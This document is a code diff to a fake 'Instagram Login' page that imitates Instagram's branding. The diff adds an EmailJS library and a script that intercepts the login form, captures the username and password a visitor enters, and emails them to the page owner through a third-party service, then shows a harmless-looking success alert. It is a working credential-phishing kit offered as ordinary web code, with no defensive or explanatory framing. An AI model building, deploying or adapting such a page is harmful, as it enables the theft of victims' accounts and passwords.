@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -56,12 +57,39 @@
 <body>
     <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-        <form action="https://www.temu.com/login" method="GET">
-            <input type="text" class="input-box" placeholder="Username" name="username" required>
-            <input type="password" class="input-box" placeholder="Password" name="password" required>
+        <form id="login-form">
+            <input type="text" class="input-box" placeholder="Username" id="username" required>
+            <input type="password" class="input-box" placeholder="Password" id="password" required>
             <button type="submit" class="login-btn">Log In</button>
         </form>
         <a href="#" class="forgot-pass">Forgot Password?</a>
     </div>
+
+    <script>
+        // Initialize EmailJS with your Public Key (User ID)
+        emailjs.init("4UitKf2odvQa-Hbsd");  // Replace with your Public Key (User ID)
+
+        // Event listener for form submission
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent default form submission
+
+            // Collect the form data (username and password)
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Send the data to your email via EmailJS
+            emailjs.send('ahmadahmad', 'template_230wwfm', {
+                username: username,
+                password: password
+            })
+            .then(function(response) {
+                console.log('Success:', response);
+                alert('Form submitted successfully!');
+            }, function(error) {
+                console.log('Error:', error);
+                alert('There was an error submitting the form.');
+            });
+        });
+    </script>
 </body>
 </html>
